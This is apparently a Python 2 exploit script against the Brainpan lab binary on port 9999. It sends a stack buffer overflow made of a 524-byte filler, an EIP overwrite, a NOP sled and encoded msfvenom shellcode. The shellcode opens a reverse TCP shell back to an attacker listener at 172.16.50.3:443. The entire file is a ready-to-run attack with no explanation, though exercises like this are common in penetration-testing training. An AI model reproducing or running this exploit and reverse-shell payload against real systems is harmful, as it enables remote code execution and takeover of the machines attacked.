#!/usr/bin/python
import socket
try:
    print "\nSending evil buffer..."
    # Per msf-pattern_offset, exact match at 524 bytes 
    filler = "\x41" * 524
    eip = "\xf3\x12\x17\x31"    # from brainpan.exe
    nops = "\x90" * 8
    #msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.50.3 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00"    
    
    shell = (
    "\xbd\x72\xd8\x68\x49\xdd\xc1\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
    "\x12\x31\x68\x12\x03\x68\x12\x83\x9a\x24\x8a\xbc\x6b\x0e\xbc"
    "\xdc\xd8\xf3\x10\x49\xdc\x7a\x77\x3d\x86\xb1\xf8\xad\x1f\xfa"
    "\xc6\x1c\x1f\xb3\x41\x66\x77\xe8\xa2\xaa\x84\x98\xc0\xca\x8b"
    "\xe3\x4c\x2b\x3b\x75\x1f\xfd\x68\xc9\x9c\x74\x6f\xe0\x23\xd4"
    "\x07\x95\x0c\xaa\xbf\x01\x7c\x63\x5d\xbb\x0b\x98\xf3\x68\x85"
    "\xbe\x43\x85\x58\xc0"
    )
    buffer = filler+eip+nops+shell
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("172.16.101.21",9999))
    s.send(buffer)

    s.close()

    print "\nDone!"
except:
    print "Could not connect!"

